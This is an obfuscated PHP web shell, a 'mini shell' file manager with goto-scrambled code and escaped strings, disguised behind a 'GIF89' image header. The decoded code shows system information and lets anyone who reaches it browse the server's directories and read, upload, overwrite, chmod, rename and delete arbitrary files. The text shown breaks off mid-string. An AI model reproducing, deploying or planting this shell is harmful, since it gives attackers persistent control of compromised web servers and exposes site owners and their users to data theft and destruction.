<?php
 goto bq5zy; jhs0k: function perms($file) { $perms = fileperms($file); if (($perms & 49152) == 49152) { $info = "\163"; } elseif (($perms & 40960) == 40960) { $info = "\154"; } elseif (($perms & 32768) == 32768) { $info = "\55"; } elseif (($perms & 24576) == 24576) { $info = "\142"; } elseif (($perms & 16384) == 16384) { $info = "\144"; } elseif (($perms & 8192) == 8192) { $info = "\143"; } elseif (($perms & 4096) == 4096) { $info = "\160"; } else { $info = "\x75"; } $info .= $perms & 256 ? "\x72" : "\x2d"; $info .= $perms & 128 ? "\167" : "\x2d"; $info .= $perms & 64 ? $perms & 2048 ? "\163" : "\170" : ($perms & 2048 ? "\x53" : "\55"); $info .= $perms & 32 ? "\x72" : "\x2d"; $info .= $perms & 16 ? "\x77" : "\x2d"; $info .= $perms & 8 ? $perms & 1024 ? "\163" : "\170" : ($perms & 1024 ? "\123" : "\55"); $info .= $perms & 4 ? "\162" : "\55"; $info .= $perms & 2 ? "\x77" : "\x2d"; $info .= $perms & 1 ? $perms & 512 ? "\164" : "\170" : ($perms & 512 ? "\124" : "\55"); return $info; } goto xq_qC; GvaWI: if (isset($_FILES["\146\x69\x6c\145"])) { if (copy($_FILES["\146\151\x6c\x65"]["\164\x6d\160\x5f\x6e\x61\x6d\145"], $path . "\x2f" . $_FILES["\x66\151\x6c\145"]["\156\141\155\145"])) { echo "\74\146\x6f\x6e\x74\40\143\157\154\157\x72\75\x22\x63\x79\x61\x6e\42\76\106\151\154\x65\x20\116\171\141\40\125\x64\150\40\x44\x69\x20\x55\160\154\157\x61\144\x20\103\165\x6b\74\x2f\146\157\x6e\164\x3e\74\x62\x72\40\57\76"; } else { echo "\x3c\x66\157\x6e\x74\40\143\x6f\x6c\157\162\x3d\x22\162\145\x64\x22\76\106\151\154\x65\x20\116\171\x61\x20\107\x61\147\141\x6c\40\x44\x69\40\125\160\154\x6f\x61\144\40\103\x75\x6b\x3c\57\146\157\x6e\x74\76\x3c\x62\x72\40\57\x3e"; } } goto Yfp6o; Xr296: $path = str_replace("\x5c", "\57", $path); goto KRoVM; KRoVM: $paths = explode("\x2f", $path); goto yFx8t; yFx8t: foreach ($paths as $id => $pat) { if ($pat == '' && $id == 0) { $a = true; echo "\74\x61\x20\x68\162\145\146\x3d\x22\x3f\160\141\164\x68\75\57\42\x3e\57\x3c\x2f\141\76"; continue; } if ($pat == '') { continue; } echo "\74\x61\40\150\162\x65\146\x3d\42\x3f\x70\141\x74\x68\x3d"; for ($i = 0; $i <= $id; $i++) { echo "{$paths[$i]}"; if ($i != $id) { echo "\57"; } } echo "\x22\76" . $pat . "\74\x2f\x61\x3e\x2f"; } goto OpJx1; s_Vlw: set_time_limit(0); goto ZREjR; Yfp6o: echo "\74\x66\x6f\162\155\x20\145\x6e\143\164\x79\x70\145\x3d\42\x6d\x75\x6c\164\151\x70\141\x72\164\57\x66\157\162\x6d\55\x64\x61\164\141\x22\40\x6d\145\164\x68\x6f\144\x3d\42\x50\x4f\123\124\x22\x3e\12\x55\160\x6c\157\x61\x64\40\x46\151\x6c\x65\40\72\40\x3c\151\156\x70\165\x74\x20\x74\171\x70\145\75\x22\x66\151\x6c\145\42\x20\156\x61\155\145\75\42\146\x69\154\145\x22\x20\x2f\x3e\12\74\x69\156\160\x75\164\40\x74\x79\x70\145\75\x22\x73\165\142\155\x69\164\x22\x20\166\x61\154\165\145\x3d\x22\165\x70\x6c\x6f\141\144\x22\40\x2f\x3e\12\x3c\x2f\x66\x6f\x72\155\76\xa\74\x2f\x74\144\76\x3c\x2f\x74\x72\x3e"; goto C4aX5; bq5zy: ?>
GIF89;<?php  goto s_Vlw; w6e4m: echo "\74\142\162\x20\x2f\76\x78\170\170\170\x78\74\146\x6f\156\x74\x20\143\x6f\154\x6f\x72\x3d\42\162\145\144\42\76\x31\x2e\60\x3c\x2f\x66\157\x6e\x74\x3e\54\40\130\130\x58\40\74\x66\x6f\x6e\x74\40\x63\157\x6c\x6f\x72\x3d\42\162\145\144\x22\x3e\170\x78\170\x78\x3c\57\x66\157\156\164\x3e\12\x3c\41\55\x2d\124\165\154\151\163\x61\x6e\40\x4d\151\162\151\156\147\x2d\55\x3e\xa\74\x73\x70\x61\156\40\x69\144\x3d\x22\163\145\x63\x22\x3e\74\x64\151\166\x20\x69\144\75\42\x66\157\164\145\x72\x22\x20\143\154\141\x73\x73\75\x22\146\157\x74\145\162\42\x20\163\x74\x79\154\145\x3d\42\160\157\x73\x69\x74\151\x6f\x6e\72\40\141\142\163\157\154\x75\x74\145\x3b\40\x74\x6f\x70\x3a\x20\67\x30\x70\170\73\40\154\x65\x66\x74\x3a\40\x2d\62\x32\x35\x70\170\x3b\40\167\151\x64\164\x68\72\x20\66\x30\60\x70\x78\x3b\x20\x68\x65\151\147\150\x74\72\40\x32\70\160\x78\x3b\x20\155\x61\162\147\151\x6e\72\40\60\160\170\x3b\x20\160\x61\x64\144\151\156\x67\x3a\40\61\60\x70\170\73\x20\146\x6f\156\x74\55\x73\x69\x7a\x65\x3a\40\x32\x34\x70\x78\x3b\40\x74\x65\x78\164\x2d\141\x6c\x69\x67\x6e\x3a\x20\x63\145\156\164\x65\x72\73\x20\143\157\x6c\157\x72\x3a\x20\x72\x67\142\x28\x32\65\x35\x2c\x20\62\x35\65\x2c\40\x32\65\x35\x29\x3b\x20\146\157\x6e\164\55\x66\141\x6d\x69\154\x79\x3a\40\46\161\x75\157\164\x3b\x74\x72\145\x62\x75\x63\150\x65\164\x20\155\163\46\161\x75\157\164\x3b\x2c\40\x43\157\x75\x72\x69\x65\162\40\x6e\x65\x77\54\x20\x63\x6f\x75\x72\x69\x65\x72\x20\x6e\x65\x77\x2c\x20\x73\x61\156\x73\55\163\x65\162\151\146\x3b\40\164\x72\x61\156\x73\x66\157\162\155\x3a\40\162\157\164\141\x74\x65\x28\x2d\64\x35\144\x65\x67\x29\x3b\40\x74\162\x61\x6e\x73\x66\x6f\162\155\x2d\157\x72\x69\x67\x69\x6e\72\40\65\60\x25\x20\x30\x70\x78\x20\60\160\x78\73\x20\x62\141\x63\x6b\x67\162\x6f\165\156\x64\55\143\x6f\x6c\157\x72\x3a\x20\x72\x67\142\50\x30\54\x20\x30\x2c\40\x30\x29\x3b\x20\x62\157\162\144\x65\162\72\40\61\160\170\x20\x73\157\154\x69\x64\40\x72\x67\x62\50\61\67\60\x2c\x20\61\67\60\54\40\x31\x37\x30\x29\x3b\40\157\160\141\143\x69\x74\171\x3a\40\x30\x2e\x35\x3b\x20\x7a\x2d\x69\x6e\x64\x65\x78\72\40\x31\62\x30\60\x3b\x22\x3e\xa\x3c\x66\x6f\x6e\164\40\x66\141\143\145\75\42\x63\x6f\165\162\x69\x65\x72\x20\x6e\x65\x77\42\x3e\x3c\155\x61\162\x71\x75\x65\x65\40\143\x6f\x6c\157\x72\x3d\42\144\x61\x72\x6b\x62\154\x75\x65\x22\40\x62\x65\150\x61\x76\151\157\162\x3d\42\106\x6c\x69\x70\x22\x20\163\143\162\157\x6c\x6c\x61\x6d\x6f\x75\x6e\x74\x3d\42\x36\x22\40\x77\151\144\164\150\75\x22\65\60\x25\x22\x20\163\164\x79\154\x65\x3d\42\x77\x69\144\x74\x68\72\x20\x35\60\x25\73\42\x3e\123\x50\105\x43\111\115\x45\116\124\x20\115\x49\x4e\111\40\123\110\105\x4c\x4c\x20\x2d\12\40\x52\105\x43\117\x44\105\x44\x20\106\x52\117\115\40\x50\110\x41\116\x54\x4f\115\40\107\x48\117\123\x54\74\57\x6d\x61\162\161\x75\145\145\x3e\74\57\x66\x6f\x6e\164\x3e\74\57\144\x69\166\76\x3c\57\x73\160\141\x6e\x3e\12\74\x21\x2d\55\x3c\x69\x66\162\141\x6d\145\x20\167\x69\144\164\x68\75\42\60\x22\40\x68\x65\151\147\150\164\x3d\x22\x30\42\40\x73\x72\x63\x3d\42\x68\x74\164\160\x73\72\x2f\x2f\167\x77\167\56\171\x6f\165\164\165\x62\145\56\143\x6f\x6d\57\145\155\x62\x65\x64\57\61\x2d\170\x47\x65\x72\166\65\106\117\153\77\141\x75\x74\x6f\160\154\x61\171\75\x31\42\x20\x66\162\x61\x6d\x65\x62\x6f\x72\144\145\162\75\42\x30\x22\40\x61\x6c\154\x6f\167\146\165\154\x6c\163\x63\x72\145\x65\156\75\42\42\76\x3c\57\151\146\x72\x61\155\x65\x3e\12\12\x3c\x2f\102\x4f\104\131\x3e\12\74\x2f\x48\124\x4d\114\x3e"; goto jhs0k; u2Cn5: if (isset($_GET["\x70\141\164\x68"])) { $path = $_GET["\160\x61\164\150"]; } else { $path = getcwd(); } goto Xr296; OpJx1: echo "\74\x2f\164\144\x3e\74\x2f\164\x72\x3e\74\x74\162\x3e\x3c\x74\x64\76"; goto GvaWI; riI52: echo "\74\x21\x44\117\x43\124\x59\120\105\40\x48\124\115\114\x3e\12\74\x48\124\115\114\76\xa\x3c\110\x45\101\104\76\xa\x3c\154\151\156\x6b\x20\x68\x72\x65\x66\75\x22\x22\40\162\145\154\x3d\x22\163\164\x79\154\x65\x73\150\145\145\164\x22\x20\x74\x79\160\145\75\x22\164\145\x78\164\57\143\163\163\42\76\xa\x3c\x74\151\164\x6c\x65\76\321\x84\xd0\260\320\271\320\273\40\xd0\272\320\xbe\xd1\200\xd0\276\320\273\320\265\xd0\xb2\xd1\x81\xd1\x82\320\262\320\276\x3c\x2f\164\151\164\x6c\x65\76\xa\74\x73\164\x79\154\x65\x3e\12\142\x6f\x64\171\x7b\12\143\157\x6c\x6f\x72\x3a\40\x23\x66\x66\x66\73\12\146\x6f\x6e\164\x2d\x66\141\155\x69\154\x79\x3a\x20\42\x63\x6f\165\x72\151\x65\x72\40\x6e\145\x77\x22\54\40\143\x75\x72\x73\151\166\x65\73\12\142\141\143\x6b\x67\162\x6f\165\156\x64\55\143\x6f\154\x6f\162\x3a\40\43\145\x36\145\x36\x65\66\x3b\12\x74\145\170\x74\55\163\150\141\144\157\167\x3a\60\x70\170\40\60\x70\170\x20\61\x70\170\40\x23\67\x35\67\x35\x37\65\73\xa\x62\x61\x63\153\x67\x72\157\x75\x6e\144\55\160\x6f\x73\x69\164\x69\157\x6e\72\40\143\x65\156\x74\145\162\73\12\x9\142\x61\143\153\147\x72\157\165\156\144\x2d\143\x6f\154\157\x72\72\43\143\63\x63\66\x65\66\x3b\12\40\40\x20\40\x68\145\x69\147\x68\164\x3a\x39\70\45\x3b\12\40\x20\40\x20\167\x69\x64\x74\150\x3a\71\71\45\x3b\xa\x20\40\40\40\142\x61\143\x6b\x67\x72\157\165\156\144\55\x61\164\x74\141\x63\x68\155\145\x6e\x74\72\40\x66\151\x78\x65\x64\x3b\12\40\40\40\40\142\x61\143\x6b\x67\x72\157\x75\156\x64\55\x73\x69\x7a\x65\x3a\61\x30\60\45\40\61\61\x37\x25\x3b\12\11\x62\141\x63\153\147\x72\x6f\x75\x6e\144\55\151\x6d\x61\147\145\x3a\165\x72\154\50\150\x74\164\160\163\72\x2f\x2f\x69\155\x67\60\x30\x2e\144\145\166\x69\141\x6e\x74\141\162\x74\56\156\145\164\57\x32\62\x37\x32\57\x69\x2f\x32\x30\x31\x36\57\x31\66\x36\57\x63\57\144\57\141\x64\165\x6c\x74\x5f\x6e\145\x70\164\165\x6e\x65\x5f\155\151\156\x69\x6d\141\x6c\x69\163\164\x5f\x62\x61\x63\x6b\147\162\157\165\x6e\x64\137\x62\171\x5f\x77\x65\145\x62\x6c\x6f\162\x64\163\165\160\162\145\x6d\145\55\x64\x61\x36\x65\x63\x31\x33\x2e\160\156\147\51\x3b\12\x9\x63\x75\x72\x73\x6f\x72\72\40\165\x72\x6c\x28\x68\x74\164\x70\72\x2f\x2f\143\x75\x72\x2e\143\165\162\x73\157\x72\x73\55\x34\x75\56\156\145\164\x2f\143\165\x72\x73\x6f\162\163\57\x63\x75\162\x2d\61\61\x2f\143\x75\x72\x31\60\x32\x35\x2e\141\x6e\151\x29\x2c\x20\165\162\x6c\x28\x68\x74\x74\160\72\57\x2f\x63\x75\x72\x2e\x63\165\162\x73\157\162\x73\x2d\64\165\56\156\145\164\x2f\143\165\x72\163\157\162\163\x2f\x63\165\x72\55\x31\x31\x2f\x63\165\x72\61\x30\x32\65\56\160\x6e\x67\51\54\x20\x70\162\157\x67\162\x65\163\x73\x20\x21\x69\x6d\x70\157\x72\164\x61\156\x74\x3b\xa\x7d\xa\x23\x63\x6f\x6e\164\x65\156\164\40\164\162\72\x68\157\166\145\162\x7b\12\x62\x61\x63\153\x67\x72\157\165\156\144\x2d\x63\157\x6c\157\162\x3a\40\43\x32\x34\144\61\144\64\x3b\12\164\x65\170\164\x2d\163\150\x61\x64\157\167\72\60\x70\x78\40\60\x70\x78\40\61\60\x70\170\40\43\x32\64\144\61\144\x34\73\xa\175\xa\43\x63\157\x6e\x74\145\156\x74\40\x2e\x66\151\x72\163\164\173\xa\x62\141\143\x6b\147\x72\157\165\156\x64\55\x63\157\x6c\157\162\x3a\x20\x23\62\x34\x64\x31\x64\64\73\12\x7d\xa\x23\143\157\x6e\x74\145\x6e\164\40\x2e\x66\x69\162\x73\164\72\x68\x6f\166\145\x72\x7b\12\142\141\143\x6b\147\x72\x6f\165\x6e\x64\x2d\x63\x6f\x6c\157\162\72\40\43\62\x34\x64\61\144\64\x3b\xa\x74\145\170\164\55\x73\x68\x61\144\157\x77\72\60\x70\x78\40\60\160\x78\x20\61\x70\170\x20\43\x63\63\x63\66\145\x36\x3b\xa\x7d\xa\164\141\142\154\145\173\12\x62\157\x72\144\x65\x72\72\x20\61\x70\x78\40\43\x32\64\x64\x31\144\64\40\163\157\154\151\x64\73\12\175\xa\x48\61\173\xa\x66\x6f\156\x74\x2d\146\141\155\x69\x6c\x79\72\x20\42\x52\x79\x65\42\x2c\x20\143\x75\162\163\151\166\145\x3b\12\175\xa\x61\173\12\x63\x6f\x6c\x6f\x72\x3a\40\x23\x66\146\x66\73\xa\164\x65\x78\x74\55\x64\x65\143\x6f\x72\x61\x74\151\x6f\x6e\x3a\40\156\157\x6e\145\73\12\175\xa\x61\72\x68\x6f\x76\x65\x72\173\xa\143\157\154\157\162\x3a\x20\43\x66\146\146\x3b\xa\x74\145\170\x74\55\163\x68\141\144\157\x77\72\60\x70\x78\40\x30\160\x78\40\x31\60\160\x78\40\x23\143\x33\x63\66\x65\66\x3b\xa\x7d\xa\x69\156\x70\x75\x74\54\163\145\x6c\x65\x63\x74\x2c\x74\x65\170\x74\141\162\145\141\173\12\142\x6f\162\144\145\x72\x3a\40\61\160\170\x20\x23\146\146\146\x20\x73\157\x6c\x69\144\73\12\55\155\x6f\172\55\142\157\162\x64\x65\162\x2d\x72\x61\144\151\x75\x73\72\x20\65\160\170\x3b\12\55\167\145\x62\153\x69\x74\x2d\x62\157\162\x64\x65\x72\55\x72\x61\144\x69\165\163\72\65\x70\170\x3b\12\x62\x6f\162\x64\145\162\55\x72\x61\x64\x69\x75\163\72\65\x70\170\73\xa\175\12\x3c\57\x73\164\171\x6c\145\x3e\12\x3c\x2f\x48\x45\101\x44\76\12\74\x42\x4f\x44\x59\x3e\xa\12\x3c\110\61\x3e\74\x63\145\156\164\145\x72\x3e\74\146\x6f\x6e\x74\x20\x63\157\x6c\x6f\162\x3d\x20\x23\x66\x66\146\x20\x66\x61\x63\145\75\143\157\x75\x72\151\x65\162\x20\156\x65\167\76\xd1\204\xd0\260\320\271\xd0\xbb\40\xd0\xba\320\276\321\200\xd0\276\320\xbb\320\xb5\xd0\262\xd1\201\xd1\x82\xd0\xb2\320\xbe\74\x2f\x66\157\x6e\164\x3e\x3c\57\x63\145\x6e\164\x65\x72\76\x3c\57\110\61\76\xa\74\x74\141\142\154\145\x20\x77\151\144\164\x68\x3d\42\67\x30\60\x22\x20\142\x6f\162\x64\145\x72\75\42\x30\42\40\143\x65\154\x6c\160\141\x64\144\x69\x6e\x67\x3d\42\63\x22\x20\x63\145\x6c\154\163\x70\141\143\151\156\147\x3d\42\x31\x22\x20\141\x6c\151\147\156\x3d\42\x63\x65\156\164\x65\162\42\76\xa\x3c\164\162\76\74\164\x64\76\x53\x79\163\x74\x65\x6d\x3a\40\74\142\76" . php_uname() . "\74\x2f\142\x3e\x3c\142\162\x3e\x3c\x62\162\76\x43\x75\162\x72\x65\156\x74\40\x50\x61\164\150\40\72\40"; goto u2Cn5; C4aX5: if (isset($_GET["\146\x69\x6c\x65\163\162\143"])) { echo "\x3c\x74\162\76\x3c\164\144\x3e\x43\x75\162\162\x65\x6e\x74\40\106\151\154\x65\40\72\x20"; echo $_GET["\146\151\x6c\x65\x73\162\143"]; echo "\74\57\164\x72\x3e\x3c\57\164\x64\x3e\74\x2f\164\x61\142\x6c\145\x3e\x3c\142\x72\x20\x2f\76"; echo "\74\160\162\x65\x3e" . htmlspecialchars(file_get_contents($_GET["\x66\151\x6c\x65\x73\162\143"])) . "\x3c\57\160\x72\x65\76"; } elseif (isset($_GET["\157\x70\164\151\157\156"]) && $_POST["\x6f\x70\164"] != "\x64\145\x6c\145\x74\145") { echo "\x3c\x2f\x74\x61\142\x6c\145\x3e\74\x62\162\x20\x2f\76\x3c\143\145\x6e\x74\x65\162\x3e" . $_POST["\160\141\164\150"] . "\74\142\162\x20\x2f\76\74\142\x72\40\x2f\x3e"; if ($_POST["\157\160\x74"] == "\x63\x68\x6d\157\144") { if (isset($_POST["\x70\145\162\155"])) { if (chmod($_POST["\x70\141\x74\x68"], $_POST["\x70\x65\x72\x6d"])) { echo "\74\x66\157\x6e\164\40\143\x6f\154\x6f\162\75\42\x63\x79\x61\156\x22\x3e\103\x68\x61\x6e\x67\x65\40\x50\145\162\155\x69\163\x73\x69\157\156\x20\x44\157\156\145\x2e\x3c\x2f\146\x6f\x6e\x74\76\x3c\x62\162\x20\57\76"; } else { echo "\x3c\x66\157\156\x74\40\x63\x6f\154\x6f\162\x3d\x22\162\145\144\42\76\103\x68\x61\156\x67\145\x20\x50\x65\x72\x6d\x69\x73\163\151\157\x6e\40\105\162\x72\157\162\x2e\74\57\146\157\x6e\x74\76\x3c\x62\162\x20\x2f\76"; } } echo "\x3c\x66\x6f\x72\x6d\40\x6d\x65\x74\x68\157\x64\75\42\120\x4f\x53\124\42\76\xa\120\145\x72\155\x69\x73\163\x69\157\x6e\x20\x3a\40\x3c\x69\156\160\x75\164\x20\x6e\x61\155\145\75\x22\x70\145\x72\155\42\40\x74\171\160\145\75\x22\164\x65\170\x74\42\40\x73\x69\172\x65\x3d\x22\64\x22\x20\166\x61\154\165\145\x3d\x22" . substr(sprintf("\x25\x6f", fileperms($_POST["\160\141\x74\x68"])), -4) . "\42\x20\57\x3e\12\x3c\151\156\160\x75\164\x20\164\171\x70\x65\x3d\x22\150\151\x64\144\x65\156\x22\x20\156\x61\x6d\145\x3d\x22\160\x61\164\x68\42\x20\x76\x61\x6c\x75\x65\75\x22" . $_POST["\x70\141\164\x68"] . "\x22\x3e\12\74\151\x6e\160\x75\x74\40\x74\171\160\145\x3d\x22\x68\151\144\x64\145\x6e\42\x20\x6e\141\x6d\x65\x3d\42\157\160\x74\42\x20\x76\141\x6c\x75\145\x3d\42\143\x68\155\157\144\x22\76\xa\x3c\x69\x6e\160\165\x74\40\164\171\160\x65\x3d\42\x73\165\x62\x6d\x69\164\42\40\166\141\x6c\165\x65\75\42\x43\162\x6f\x74\x7a\x7a\x2e\56\x22\40\x2f\x3e\12\x3c\57\x66\157\162\x6d\x3e"; } elseif ($_POST["\x6f\160\164"] == "\x72\x65\156\141\x6d\145") { if (isset($_POST["\156\145\x77\156\x61\155\145"])) { if (rename($_POST["\x70\141\164\x68"], $path . "\57" . $_POST["\156\x65\x77\x6e\141\x6d\145"])) { echo "\x3c\x66\x6f\x6e\164\40\143\x6f\154\157\x72\75\x22\x63\171\141\x6e\42\x3e\x43\150\x61\x6e\x67\x65\40\x4e\x61\x6d\x65\x20\123\165\x63\x63\x65\x73\x2e\74\57\146\x6f\x6e\x74\76\x3c\142\162\x20\x2f\76"; } else { echo "\74\146\157\156\x74\40\x63\157\x6c\x6f\x72\x3d\x22\x72\145\x64\42\x3e\103\150\141\156\x67\145\40\x4e\x61\x6d\145\x20\105\x72\162\x6f\162\56\74\x2f\146\157\156\164\76\74\x62\162\40\57\x3e"; } $_POST["\x6e\x61\155\145"] = $_POST["\156\145\x77\156\x61\155\145"]; } echo "\x3c\x66\x6f\162\155\40\x6d\x65\x74\x68\x6f\144\x3d\42\x50\117\123\x54\42\x3e\xa\116\145\x77\x20\116\141\x6d\x65\40\x3a\40\x3c\151\156\160\165\164\40\156\x61\155\145\75\42\156\145\167\156\x61\x6d\145\42\40\x74\x79\160\x65\75\x22\x74\145\x78\164\42\40\163\151\x7a\x65\x3d\42\x32\60\42\x20\166\141\x6c\x75\x65\75\42" . $_POST["\x6e\x61\x6d\145"] . "\x22\x20\x2f\x3e\12\74\151\x6e\x70\165\164\40\x74\171\160\x65\x3d\42\150\x69\144\x64\145\156\42\x20\156\141\155\145\x3d\42\x70\x61\164\x68\x22\x20\x76\141\154\x75\x65\75\42" . $_POST["\x70\141\164\150"] . "\x22\x3e\xa\74\x69\x6e\x70\165\x74\x20\164\x79\x70\x65\x3d\42\x68\151\144\144\x65\156\x22\40\156\x61\x6d\x65\75\42\x6f\x70\x74\42\x20\166\141\x6c\x75\145\x3d\x22\162\x65\x6e\x61\x6d\x65\42\x3e\12\74\151\x6e\160\165\164\40\164\171\x70\145\x3d\x22\163\165\x62\x6d\x69\x74\42\x20\x76\x61\x6c\x75\145\75\x22\x43\162\x6f\x74\x7a\172\56\56\42\x20\57\76\12\74\x2f\146\157\162\155\76"; } elseif ($_POST["\x6f\160\x74"] == "\145\x64\x69\164") { if (isset($_POST["\163\x72\x63"])) { $fp = fopen($_POST["\x70\x61\164\x68"], "\x77"); if (fwrite($fp, $_POST["\163\162\x63"])) { echo "\74\x66\x6f\156\164\x20\143\157\154\157\x72\75\42\143\171\141\156\42\x3e\x45\144\x69\x74\40\106\x69\154\145\40\x53\x75\x63\143\145\x73\x3c\57\x66\x6f\x6e\164\76\x3c\142\x72\40\57\76"; } else { echo "\74\146\157\156\x74\40\x63\157\154\157\x72\x3d\42\x72\145\x64\x22\76\105\144\x69\164\x20\106\x69\x6c\145\40\x45\162\x72\x6f\x72\x3c\x2f\x66\x6f\156\164\x3e\74\142\162\40\x2f\76"; } fclose($fp); } echo "\74\146\x6f\x72\x6d\x20\x6d\x65\164\x68\x6f\144\x3d\x22\120\x4f\123\124\42\x3e\xa\x3c\164\145\170\164\x61\162\145\x61\x20\143\157\154\163\x3d\x38\60\40\162\x6f\167\163\75\x32\x30\40\x6e\x61\x6d\x65\x3d\42\163\x72\143\x22\76" . htmlspecialchars(file_get_contents($_POST["\x70\141\x74\150"])) . "\74\x2f\164\x65\x78\x74\141\x72\x65\141\76\74\x62\x72\40\x2f\x3e\12\74\151\x6e\160\x75\164\x20\164\x79\160\x65\75\x22\x68\x69\144\x64\145\156\x22\x20\x6e\141\155\145\x3d\x22\x70\141\164\150\x22\40\x76\x61\154\165\145\x3d\x22" . $_POST["\x70\141\164\150"] . "\42\x3e\12\74\x69\x6e\160\x75\164\40\164\x79\160\x65\x3d\42\x68\x69\x64\x64\x65\x6e\x22\x20\156\x61\155\145\x3d\x22\157\x70\x74\x22\40\x76\x61\x6c\165\x65\75\42\x65\x64\151\164\x22\76\12\x3c\x69\x6e\x70\165\x74\x20\x74\x79\x70\145\75\x22\163\165\142\x6d\x69\164\42\40\x76\x61\154\x75\x65\x3d\42\103\162\x6f\x74\172\x7a\56\x2e\42\x20\57\76\xa\74\57\x66\x6f\x72\x6d\76"; } echo "\x3c\57\x63\145\x6e\x74\x65\162\76"; } else { echo "\74\57\x74\x61\x62\x6c\145\x3e\74\142\162\x2f\x3e\x3c\x63\145\156\x74\145\x72\76"; if (isset($_GET["\x6f\x70\x74\151\x6f\x6e"]) && $_POST["\157\x70\164"] == "\144\145\154\145\164\145") { if ($_POST["\164\x79\x70\x65"] == "\144\151\162") { if (rmdir($_POST["\160\141\x74\x68"])) { echo "\x3c\x66\157\156\x74\x20\x63\157\154\157\x72\75\42\x63\x79\141\156\42\76\x44\x65\154\x65\164\x65\x20\x44\151\x72\x20\x53\165\x63\143\145\x73\56\x3c\57\x66\157\x6e\164\x3e\74\142\x72\x20\57\x3e"; } else { echo "\74\146\x6f\x6e\164\x20\x63\157\x6c\x6f\x72\75\42\x72\x65\144\42\76\104\x65\x6c\145\x74\145\40\104\151\162\x20\105\x72\162\x6f\162\56\74\x2f\x66\157\x6e\x74\x3e\74\142\162\40\57\x3e"; } } elseif ($_POST["\x74\x79\160\x65"] == "\146\x69\154\x65") { if (unlink($_POST["\x70\141\164\150"])) { echo "\74\146\157\x6e\x74\x20\x63\157\x6c\x6f\x72\x3d\x22\143\171\141\x6e\42\76\104\145\154\x65\x74\145\x20\106\151\154\x65\40\123\165\143\x63\145\163\x2e\74\x2f\x66\157\x6e\164\76\74\x62\x72\x20\57\x3e"; } else { echo "\74\x66\157\156\x74\x20\143\157\x6c\157\x72\75\42\162\x65\144\42\76\104\145\x6c\145\x74\x65\40\106\x69\x6c\x65\x20\x45\x72\162\157\162\56\74\x2f\146\157\x6e\x74\x3e\x3c\x62\162\x20\x2f\x3e"; } } } echo "\x3c\x2f\143\x65\156\164\x65\x72\x3e"; $scandir = scandir($path); echo "\74\77\x70\150\x70\xa\x64\75\42\143\x6f\x6e\x74\145\156\x74\x22\76\74\164\141\x62\154\x65\x20\x77\x69\144\164\x68\x3d\x22\x37\60\x30\42\x20\142\157\x72\144\145\x72\75\x22\60\x22\40\143\145\154\154\x70\x61\x64\144\x69\x6e\147\75\x22\x33\42\x20\x63\145\154\154\x73\160\141\143\151\156\x67\75\42\61\x22\x20\x61\x6c\x69\147\156\75\42\143\x65\156\164\x65\162\42\x3e\12\74\164\162\x20\143\154\141\x73\163\x3d\42\146\151\162\x73\x74\42\x3e\12\x3c\164\144\x3e\74\143\x65\156\164\145\162\76\x3c\x66\x6f\156\164\x20\x63\x6f\x6c\157\162\75\167\150\151\x74\145\76\x4e\141\x6d\145\x3c\57\x66\x6f\156\164\x3e\x3c\x2f\x63\145\156\164\x65\162\x3e\74\57\x74\x64\76\xa\74\164\144\76\74\143\x65\x6e\164\x65\162\76\74\x66\x6f\156\x74\x20\143\157\154\157\x72\75\x77\x68\x69\x74\145\76\x53\x69\x7a\x65\74\x2f\x66\x6f\156\x74\76\x3c\57\143\145\156\x74\x65\162\76\74\x2f\164\x64\76\xa\x3c\164\x64\76\74\x63\x65\x6e\x74\145\x72\x3e\x3c\x66\x6f\x6e\x74\x20\x63\157\154\157\x72\75\x77\x68\151\164\x65\x3e\x50\145\x72\155\151\x73\163\151\157\156\163\x3c\57\146\157\x6e\164\x3e\x3c\57\x63\x65\156\x74\x65\162\76\x3c\x2f\x74\144\x3e\12\74\x74\144\76\74\x63\145\156\x74\x65\162\x3e\74\146\157\x6e\x74\40\x63\157\154\157\x72\x3d\167\x68\151\164\145\x3e\101\143\164\151\157\x6e\x3c\x2f\146\x6f\156\164\76\74\57\x63\x65\156\x74\x65\x72\76\74\x2f\164\x64\x3e\xa\74\57\x74\162\x3e"; foreach ($scandir as $dir) { if (!is_dir("{$path}\57{$dir}") || $dir == "\x2e" || $dir == "\x2e\x2e") { continue; } echo "\74\x74\162\x3e\xa\x3c\164\144\76\74\141\40\x68\x72\x65\x66\75\42\x3f\160\x61\164\x68\75{$path}\x2f{$dir}\42\x3e{$dir}\74\57\141\76\74\57\x74\x64\76\12\74\x74\144\76\74\x63\x65\x6e\x74\145\162\x3e\x2d\x2d\x3c\57\x63\x65\x6e\x74\145\162\x3e\74\x2f\x74\144\x3e\12\x3c\x74\144\x3e\x3c\143\145\156\x74\x65\162\76"; if (is_writable("{$path}\x2f{$dir}")) { echo "\x3c\x66\157\x6e\x74\x20\143\157\154\157\x72\75\x22\x63\171\x61\156\42\x3e"; } elseif (!is_readable("{$path}\57{$dir}")) { echo "\x3c\146\157\156\x74\40\x63\x6f\x6c\157\x72\x3d\42\162\x65\144\x22\76"; } echo perms("{$path}\x2f{$dir}"); if (is_writable("{$path}\x2f{$dir}") || !is_readable("{$path}\57{$dir}")) { echo "\x3c\57\146\x6f\x6e\x74\76"; } echo "\x3c\x2f\143\x65\156\x74\145\162\76\x3c\x2f\164\x64\x3e\xa\x3c\x74\x64\x3e\74\x63\x65\156\x74\x65\x72\x3e\x3c\x66\157\162\155\40\x6d\x65\164\x68\x6f\144\x3d\42\120\x4f\x53\124\x22\40\x61\x63\164\151\157\156\75\42\77\x6f\x70\x74\151\157\x6e\x26\160\x61\x74\x68\75{$path}\42\x3e\12\x3c\163\x65\154\145\x63\x74\40\156\141\x6d\145\75\42\157\x70\164\42\76\12\74\x6f\x70\164\151\157\x6e\40\166\x61\x6c\165\145\75\x22\x22\76\74\57\157\x70\x74\151\157\x6e\x3e\12\74\x6f\x70\x74\151\x6f\156\40\166\x61\x6c\165\145\x3d\x22\x64\x65\x6c\145\x74\145\x22\76\104\145\154\x65\x74\145\74\57\x6f\x70\164\x69\x6f\x6e\x3e\12\74\157\160\164\x69\157\x6e\40\x76\x61\x6c\165\x65\x3d\x22\143\150\155\157\144\42\x3e\x43\x68\x6d\157\x64\x3c\x2f\157\160\x74\151\157\156\76\xa\74\157\160\164\151\157\156\40\166\x61\154\165\x65\x3d\x22\x72\x65\156\x61\155\x65\42\76\x52\145\156\x61\155\145\74\x2f\157\x70\164\x69\157\156\x3e\xa\74\x2f\x73\x65\x6c\x65\x63\x74\x3e\xa\74\x69\156\160\165\164\40\x74\171\160\x65\x3d\42\x68\151\x64\144\x65\156\42\40\156\141\x6d\x65\75\42\164\x79\x70\x65\